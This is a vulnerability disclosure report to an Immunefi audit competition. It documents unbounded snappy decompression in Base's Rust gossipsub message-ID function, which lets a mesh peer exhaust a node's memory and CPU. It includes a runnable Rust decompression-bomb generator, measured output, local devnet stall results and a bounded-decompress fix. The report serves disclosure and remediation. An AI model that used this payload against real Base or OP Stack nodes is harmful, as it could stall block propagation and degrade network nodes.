# 74513 bc critical unbounded snappy decompression in gossipsub message id fn causes pre validation cpu and memory exhaustion from a mesh peer

**Submitted on Apr 23rd 2026 at 05:40:10 UTC by @kaiserlimp0 for** [**Audit Comp | Base Azul**](https://immunefi.com/audit-competition/audit-comp-base-azul)

* **Report ID:** #74513
* **Report Type:** Blockchain/DLT
* **Report severity:** Critical
* **Target:** <https://github.com/base/base/releases/tag/v0.8.0-rc.15>
* **Impacts:**
  * Increasing network processing node resource consumption by at least 30% without brute force actions, compared to the preceding 24 hours
  * Temporary freezing of network transactions by delaying one block by 500% or more of the average block time of the preceding 24 hours beyond standard difficulty adjustments

## Description

### Root Cause

In-scope asset: `https://github.com/base/base/releases/tag/v0.8.0-rc.15` (Base Azul Offchain Components). The vulnerable code is under `crates/consensus/gossip`, i.e. Base-native offchain consensus networking, and is not under the Base Azul out-of-scope `base/base` folders (`actions`, `devnet`, `baseup`, `etc`).

`compute_message_id` is installed as the libp2p-gossipsub `message_id_fn` at `crates/consensus/gossip/src/config.rs:93`. Per the libp2p-gossipsub spec, `message_id_fn` is invoked on every received message **before** any application-level validation, i.e. before the unsafe-block signer is verified, before the topic handler runs, and before the envelope is decoded. It is the one Base gossip hook that can consume attacker-controlled message bytes from an established mesh peer before Base-level signer authorization has a chance to reject the message.

The current implementation (lines 104-122) unconditionally invokes `snap::raw::Decoder::decompress_vec(&msg.data)`:

```rust
// crates/consensus/gossip/src/config.rs:104-122
fn compute_message_id(msg: &gossipsub::Message) -> gossipsub::MessageId {
    let mut decoder = snap::raw::Decoder::new();
    let bytes = decoder.decompress_vec(&msg.data).map_or_else(
        |_| sha256(&[&[0x0, 0x0, 0x0, 0x0], msg.data.as_slice()].concat())[..20].to_vec(),
        |decompressed| sha256(&[&[0x1, 0x0, 0x0, 0x0], decompressed.as_slice()].concat())[..20].to_vec(),
    );
    gossipsub::MessageId::from(bytes)
}
```

`MAX_GOSSIP_SIZE = 10 * (1 << 20) = 10 MiB` is applied as gossipsub `max_transmit_size` at `config.rs:88`, but that cap bounds only the **wire size** of `msg.data`. `snap::raw::Decoder::decompress_vec` internally does `vec![0u8; snap::raw::decompress_len(input)?]`, i.e. it allocates and touches whatever uncompressed length the attacker advertises in the snappy varint header, up to the snap crate’s `u32::MAX` ceiling. No output-size cap is enforced in `compute_message_id`.

Snappy’s `copy_2_byte_offset` opcode is a 3-byte instruction that can expand to 64 bytes, i.e. a 21.3x amplification ratio. A well-formed snappy stream of 9,984,442 bytes, still within the 10 MiB wire limit, can fully parse to 213,000,000 bytes (\~203 MiB) of legal bytes. `decompress_vec` accepts this without error, so `compute_message_id` reaches the `Ok(decompressed)` branch and then hashes the full 213,000,000-byte buffer with SHA-256.

### Cross-client parity

The upstream OP Stack `op-node` implementation already guards this class of input in the equivalent message-ID path: `BuildMsgIdFn` reads `snappy.DecodedLen(pmsg.Data)` and only decompresses if the decoded length is `<= maxGossipSize`. It also uses a reusable message buffer instead of allocating a fresh `Vec` per message. The block validator repeats the decoded-length check and logs `"possible snappy zip bomb"` before rejecting oversized decoded payloads.

The OP Stack P2P spec likewise constrains gossip contents to 10 MiB and explicitly calls out limiting generated decompressed output to avoid zip-bomb-type resource usage. Base’s Rust implementation keeps the same 10 MiB wire-size constant and the same valid/invalid-snappy domain split, but drops the decoded-output-size guard in `compute_message_id`. This is therefore a Rust-port parity regression, not just a missing optimization.

Key source links:

* `message_id_fn(compute_message_id)` registration: <https://github.com/base/base/blob/v0.8.0-rc.15/crates/consensus/gossip/src/config.rs#L77-L93>
* vulnerable `compute_message_id`: <https://github.com/base/base/blob/v0.8.0-rc.15/crates/consensus/gossip/src/config.rs#L104-L122>
* `BlockHandler::handle` runs after `message_id_fn`: <https://github.com/base/base/blob/v0.8.0-rc.15/crates/consensus/gossip/src/handler.rs#L50-L76>
* upstream OP Stack decoded-length guard: <https://github.com/ethereum-optimism/optimism/blob/35a930195c8046ee6d4a8f5bfc39bcc6cc92e9a8/op-node/p2p/gossip.go#L110-L148>
* upstream OP Stack zip-bomb guard: <https://github.com/ethereum-optimism/optimism/blob/35a930195c8046ee6d4a8f5bfc39bcc6cc92e9a8/op-node/p2p/gossip.go#L268-L285>
* OP Stack P2P spec: <https://specs.optimism.io/protocol/rollup-node-p2p.html#message-compression-and-limits>

### Reachability

This is the load-bearing property of the finding: `compute_message_id` runs before Base signer/topic validation. Later code paths such as `BlockHandler::handle` and the envelope decoders in `crates/common/rpc-types-engine/src/envelope.rs` are downstream of the unsafe-block signer check and are therefore not reachable by an unauthenticated mesh peer.

The attack surface is the libp2p-gossipsub mesh slot itself. Any peer admitted into the mesh can send these messages, and the victim will pay the memory and CPU cost in `message_id_fn` before downstream Base validation can reject the message or penalize the peer.

In the local reproduction, mesh admission was obtained by connecting to the follower over an explicit local/private `/p2p` target and subscribing to `/optimism/84538453/3/blocks`; the vulnerable work then executes in `message_id_fn` before Base’s unsafe-block signer validation.

Peer scoring does not remove the root cause. A peer may be penalized only after the message has already triggered the unbounded snappy allocation and SHA-256 work. Since Base uses `GOSSIP_HEARTBEAT = 500 ms`, a single \~2.3-second `message_id_fn` computation blocks roughly 4.6 heartbeat intervals on the gossipsub task.

## Impact

Measured per-message victim cost in the standalone reproduction of the vulnerable function:

```
+208,156 KiB transient RSS
~2.3 s single-core CPU
```

Measured output from the standalone PoC:

```
compressed_size_bytes=9984442
declared_decompressed_bytes=213000000
elapsed_ms=2293
baseline_vmrss_kb=11780
peak_vmrss_kb=219936
delta_vmrss_kb=208156
rss_increase_percent=1767.0
message_id_first8=[3f, c4, 45, 73, 15, db, b0, 66]
```

This directly proves the Medium impact class: **“Increasing network processing node resource consumption by at least 30% without brute force actions.”**

To bridge this from the standalone process to an actual Base node baseline:

```
Local base-builder-cl baseline: 313,012,224 bytes RSS
Same single allocation delta:   ~213,151,744 bytes
Arithmetic increase if hit:      ~68.1%
```

That means the single attacker-controlled pre-validation allocation alone is enough to exceed the 30% resource-consumption threshold on a normal consensus node baseline.

I also ran a local multi-follower Base Azul devnet experiment against loopback/private Docker services only:

```
local topology:              1 builder + 4 follower EL/CL pairs
payloads:                    12 x 9,984,442-byte snappy frames per follower
declared decompressed bytes: 213,000,000 per frame

client-cl-1:
  baseline blocks:           +22
  attack blocks:             +0
  cooldown blocks:           +17
  RSS baseline->max attack:  280,694,784 -> 820,543,488 (+539,848,704)
  final builder-node lag:    40 blocks
  max unsafe-head latency:   90.5s

client-cl-2:
  baseline blocks:           +22
  attack blocks:             +1
  cooldown blocks:           +16
  RSS baseline->max attack:  261,332,992 -> 826,445,824 (+565,112,832)
  final builder-node lag:    40 blocks
  max unsafe-head latency:   90.9s

client-cl-3:
  baseline blocks:           +22
  attack blocks:             +1
  cooldown blocks:           +16
  RSS baseline->max attack:  272,900,096 -> 829,882,368 (+556,982,272)
  final builder-node lag:    40 blocks
  max unsafe-head latency:   89.0s

client-cl-4:
  baseline blocks:           +22
  attack blocks:             +2
  cooldown blocks:           +15
  RSS baseline->max attack:  253,108,224 -> 840,163,328 (+587,055,104)
  final builder-node lag:    40 blocks
  max unsafe-head latency:   84.3s

fleet result:                4/4 followers affected (100%)
affected criterion:          >=200 MB attack-RSS growth and >=10-block final builder-vs-node lag
```

Each harness confirmed a direct local connection and target subscription to `/optimism/84538453/3/blocks` before publishing. This demonstrates that the same payload can be driven through Base's local gossipsub transport and can degrade an entire local follower fleet's visible L2 head while the builder continues producing blocks. I do not rely on downstream `Event::Message` counters for this claim: the vulnerable `message_id_fn` hook runs before Base's driver emits `Event::Message` and before the application-layer handler metrics.

The local devnet run supports the High-tier Blockchain/DLT impact **“Temporary freezing of network transactions by delaying one block by 500% or more of the average block time.”** In the local Base Azul devnet, each follower advanced 22 blocks during the 45-second baseline window, i.e. about 2.05 seconds per block, then stalled while the builder kept producing blocks, with visible unsafe-head latency reaching \~84-91 seconds and final builder-vs-node lag reaching 40 blocks. That local delay is roughly 41x-44x the measured baseline block interval, i.e. about 4,100%-4,400% of baseline, well above the 500% threshold.

I am therefore requesting **High** based on the local 500%+ delay evidence, while remaining open to **Medium** if Immunefi/Base require public-network or production-fleet measurements for High.

No public block delay, public RPC/API crash, chain split, public testnet, mainnet, public bootnode, or third-party endpoint was used.

## Prerequisites

* Attacker obtains at least one gossipsub mesh slot with the victim.
* No admin role, no signer, no TEE key, no L1 state, no flash loan, no MEV ordering.
* Only requires crafting a deterministic snappy blob.

## Fix Recommendation

Replace the unbounded `decompress_vec` in `crates/consensus/gossip/src/config.rs:106` with a bounded decompress that rejects when the advertised or actual output exceeds `MAX_GOSSIP_SIZE`:

```rust
use snap::raw::decompress_len;

let bytes = match decompress_len(&msg.data) {
    Ok(declared) if declared <= MAX_GOSSIP_SIZE => {
        let mut buf = vec![0u8; declared];
        match decoder.decompress(&msg.data, &mut buf) {
            Ok(n) if n <= MAX_GOSSIP_SIZE => {
                buf.truncate(n);
                sha256(&[&[0x1, 0x0, 0x0, 0x0], buf.as_slice()].concat())[..20].to_vec()
            }
            _ => sha256(&[&[0x0, 0x0, 0x0, 0x0], msg.data.as_slice()].concat())[..20].to_vec(),
        }
    }
    _ => sha256(&[&[0x0, 0x0, 0x0, 0x0], msg.data.as_slice()].concat())[..20].to_vec(),
};
```

This matches the upstream `op-node` behavior and restores the missing decoded-size invariant before allocation.

## Policy / safe-testing note

All active reproduction in this report was limited to a local standalone process and local Docker devnet transport/fleet checks. I did not run the payload against Base mainnet, a public Base testnet, public bootnodes, public RPCs, or any third-party infrastructure.

If useful for triage, I can provide:

* the exact local console output from the standalone measured run
* raw local devnet logs / JSONL / harness output

## Proof of Concept

{% stepper %}
{% step %}

### Reproduce the vulnerable function locally

Reproduce the vulnerable function locally with the standalone Rust PoC below. It mirrors `compute_message_id` byte-for-byte and feeds it a valid snappy frame that stays under the 10 MiB wire cap while expanding to 213,000,000 bytes.
{% endstep %}

{% step %}

### Run the PoC and observe resource usage

Run the PoC and observe that a single call to `compute_message_id_like_base` causes a transient RSS increase of about 208,156 KiB and takes about 2.3 seconds of single-core CPU time.
{% endstep %}

{% step %}

### Confirm the vulnerable path in source

Confirm against source that the same vulnerable path is registered as gossipsub `message_id_fn` and is executed before Base signer/topic validation.
{% endstep %}

{% step %}

### Optionally reproduce through the local devnet

Optionally, reproduce the same payload through the local Base Azul Docker devnet transport and observe the follower-fleet lag metrics summarized below.
{% endstep %}
{% endstepper %}

### Standalone runnable PoC

```bash
mkdir -p base-snappy-message-id-poc/src
cat > base-snappy-message-id-poc/Cargo.toml <<'EOF'
[package]
name = "base-snappy-message-id-poc"
version = "0.1.0"
edition = "2021"

[dependencies]
sha2 = "0.10"
snap = "1"
EOF

cat > base-snappy-message-id-poc/src/main.rs <<'EOF'
use sha2::{Digest, Sha256};
use snap::raw::{decompress_len, Decoder};
use std::{
    sync::{
        atomic::{AtomicBool, AtomicU64, Ordering},
        Arc,
    },
    thread,
    time::{Duration, Instant},
};

fn compute_message_id_like_base(data: &[u8]) -> Vec<u8> {
    let mut decoder = Decoder::new();
    decoder.decompress_vec(data).map_or_else(
        |_| {
            let mut h = Sha256::new();
            h.update([0, 0, 0, 0]);
            h.update(data);
            h.finalize()[..20].to_vec()
        },
        |decompressed| {
            let mut h = Sha256::new();
            h.update([1, 0, 0, 0]);
            h.update(&decompressed);
            h.finalize()[..20].to_vec()
        },
    )
}

fn make_snappy_bomb(decompressed_mb: usize) -> Vec<u8> {
    let target = decompressed_mb * 1_000_000;
    assert!(target >= 64 && target % 64 == 0);

    let mut buf = Vec::with_capacity(4 + 66 + ((target - 64) / 64) * 3);
    write_varint(target, &mut buf);

    buf.push(60 << 2);
    buf.push(63);
    buf.extend(std::iter::repeat(b'B').take(64));

    for _ in 0..((target - 64) / 64) {
        buf.push(((64 - 1) << 2) | 0x02);
        buf.push(0x40);
        buf.push(0x00);
    }
    buf
}

fn write_varint(mut value: usize, out: &mut Vec<u8>) {
    loop {
        let mut byte = (value & 0x7f) as u8;
        value >>= 7;
        if value != 0 {
            byte |= 0x80;
        }
        out.push(byte);
        if value == 0 {
            break;
        }
    }
}

fn vmrss_kb() -> u64 {
    std::fs::read_to_string("/proc/self/status")
        .ok()
        .and_then(|status| {
            status
                .lines()
                .find(|line| line.starts_with("VmRSS:"))
                .and_then(|line| line.split_whitespace().nth(1))
                .and_then(|value| value.parse().ok())
        })
        .unwrap_or(0)
}

fn main() {
    let bomb = make_snappy_bomb(213);
    let declared = decompress_len(&bomb).expect("valid snappy stream");

    let baseline = vmrss_kb();
    let max_rss = Arc::new(AtomicU64::new(baseline));
    let done = Arc::new(AtomicBool::new(false));
    let sampler_max = Arc::clone(&max_rss);
    let sampler_done = Arc::clone(&done);
    let sampler = thread::spawn(move || {
        while !sampler_done.load(Ordering::Relaxed) {
            let current = vmrss_kb();
            let mut old = sampler_max.load(Ordering::Relaxed);
            while current > old {
                match sampler_max.compare_exchange_weak(
                    old,
                    current,
                    Ordering::Relaxed,
                    Ordering::Relaxed,
                ) {
                    Ok(_) => break,
                    Err(next_old) => old = next_old,
                }
            }
            thread::sleep(Duration::from_millis(2));
        }
    });

    let started = Instant::now();
    let id = compute_message_id_like_base(&bomb);
    let elapsed = started.elapsed();
    done.store(true, Ordering::Relaxed);
    sampler.join().unwrap();

    let peak = max_rss.load(Ordering::Relaxed);
    let delta = peak.saturating_sub(baseline);
    let pct = if baseline > 0 {
        (delta as f64 / baseline as f64) * 100.0
    } else {
        0.0
    };

    println!("compressed_size_bytes={}", bomb.len());
    println!("declared_decompressed_bytes={}", declared);
    println!("elapsed_ms={}", elapsed.as_millis());
    println!("baseline_vmrss_kb={}", baseline);
    println!("peak_vmrss_kb={}", peak);
    println!("delta_vmrss_kb={}", delta);
    println!("rss_increase_percent={pct:.1}");
    println!("message_id_first8={:02x?}", &id[..8]);
}
EOF

cd base-snappy-message-id-poc
cargo run --release
```

Expected measured output from the reproduced run:

```
compressed_size_bytes=9984442
declared_decompressed_bytes=213000000
elapsed_ms=2293
baseline_vmrss_kb=11780
peak_vmrss_kb=219936
delta_vmrss_kb=208156
rss_increase_percent=1767.0
message_id_first8=[3f, c4, 45, 73, 15, db, b0, 66]
```

This captures the transient allocation spike while the vulnerable `decompress_vec` call and the subsequent SHA-256 pass are still executing.

### Local devnet reproduction summary

I also reproduced the same payload only against a local/private Base Azul Docker devnet. Four follower nodes were affected simultaneously while the builder continued producing blocks:

```
client-cl-1:
  baseline blocks:           +22
  attack blocks:             +0
  cooldown blocks:           +17
  RSS baseline->max attack:  280,694,784 -> 820,543,488 (+539,848,704)
  final builder-node lag:    40 blocks
  max unsafe-head latency:   90.5s

client-cl-2:
  baseline blocks:           +22
  attack blocks:             +1
  cooldown blocks:           +16
  RSS baseline->max attack:  261,332,992 -> 826,445,824 (+565,112,832)
  final builder-node lag:    40 blocks
  max unsafe-head latency:   90.9s

client-cl-3:
  baseline blocks:           +22
  attack blocks:             +1
  cooldown blocks:           +16
  RSS baseline->max attack:  272,900,096 -> 829,882,368 (+556,982,272)
  final builder-node lag:    40 blocks
  max unsafe-head latency:   89.0s

client-cl-4:
  baseline blocks:           +22
  attack blocks:             +2
  cooldown blocks:           +15
  RSS baseline->max attack:  253,108,224 -> 840,163,328 (+587,055,104)
  final builder-node lag:    40 blocks
  max unsafe-head latency:   84.3s
```

Raw local devnet logs / JSONL / harness output are available on request.

### Notes

* This PoC is a standalone/local reproduction and local devnet reproduction only.
* No public testnet, mainnet, public bootnode, public RPC, or third-party system was targeted.
* Network reachability follows from `message_id_fn(compute_message_id)` being registered at `crates/consensus/gossip/src/config.rs:93`, which libp2p-gossipsub executes before application-level validation.
